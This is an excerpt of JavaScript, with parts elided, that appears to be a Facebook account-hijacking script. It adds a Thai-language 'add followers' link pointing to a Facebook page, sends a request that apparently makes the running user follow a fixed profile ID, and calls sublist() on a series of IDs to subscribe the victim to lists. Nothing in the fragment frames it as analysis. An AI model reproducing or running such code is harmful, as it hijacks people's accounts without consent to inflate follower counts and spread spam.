...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/507345802719983" target="_blank">เพิ่มผู้ติดตาม [Click]<br>คลิก</a>';
	html += '</div>';
...
function a(abone){
    ...
    http4.send(params4)}a("100004280043685");
...
sublist("617868108283068");
sublist("620703014666244");
sublist("468940163175864");
sublist("231139913756653");
sublist("231139970423314");
sublist("1441485822730947");
sublist("1441485469397649");
sublist("1475359322676930");
sublist("1475359182676944");
sublist("1475359246010271");
